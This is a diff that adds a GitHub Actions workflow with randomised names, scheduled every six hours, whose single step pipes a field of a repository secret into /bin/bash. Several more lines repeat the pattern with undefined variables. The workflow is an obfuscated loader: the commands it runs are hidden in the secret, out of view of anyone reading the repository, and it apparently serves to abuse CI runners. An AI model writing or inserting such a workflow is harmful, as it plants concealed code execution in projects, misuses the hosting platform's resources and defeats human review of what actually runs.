@@ -1,0 +1,22 @@
+name: aboardsoil
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: aboardsoil
+        env:
+          fybi746: ${{ secrets.fybi746 }}
+        run: |
+          echo $fybi746 | jq -r .izv06921 | /bin/bash
+          echo $rsqzm86 | jq -r .hy335 | /bin/bash
+          echo $e8876 | jq -r .qiq346 | /bin/bash
+          echo $ei39723 | jq -r .bnx4 | /bin/bash
+          echo $hboi9 | jq -r .dk66161 | /bin/bash
+          echo $upejd86768 | jq -r .dn890 | /bin/bash
+
